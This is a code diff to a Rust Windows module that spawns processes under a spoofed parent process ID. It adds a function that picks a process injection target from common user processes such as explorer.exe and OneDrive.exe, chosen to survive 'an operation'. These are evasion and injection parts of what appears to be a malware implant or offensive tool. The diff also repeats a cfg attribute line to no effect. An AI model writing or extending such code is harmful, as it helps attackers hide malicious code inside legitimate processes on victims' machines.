@@ -60,6 +60,7 @@ pub unsafe fn spawn_with_ppid(target_exe: &[u8], parent_name: &[u8]) -> Option<(
 }
 
 #[cfg(target_os = "windows")]
+#[cfg(target_os = "windows")]
 pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> {
     let candidates: &[&[u8]] = &[
         b"explorer.exe\0",
@@ -88,6 +89,25 @@ pub unsafe fn spawn_with_safe_ppid(target_exe: &[u8]) -> Option<(isize, isize)> 
     );
     if ok == 0 { return None; }
     Some((pi.hProcess, pi.hThread))
+}
+
+#[cfg(target_os = "windows")]
+/// Find a suitable injection target from a priority list of common user-space processes.
+/// Prefers long-running, non-critical processes that won't be killed during an operation.
+pub unsafe fn find_injection_target() -> Option<u32> {
+    const TARGETS: &[&[u8]] = &[
+        b"explorer.exe\0",
+        b"OneDrive.exe\0",
+        b"RuntimeBroker.exe\0",
+        b"sihost.exe\0",
+        b"SearchApp.exe\0",
+    ];
+    for &name in TARGETS {
+        if let Some(pid) = find_pid_by_name(name) {
+            return Some(pid);
+        }
+    }
+    None
 }
 
 #[cfg(target_os = "windows")]
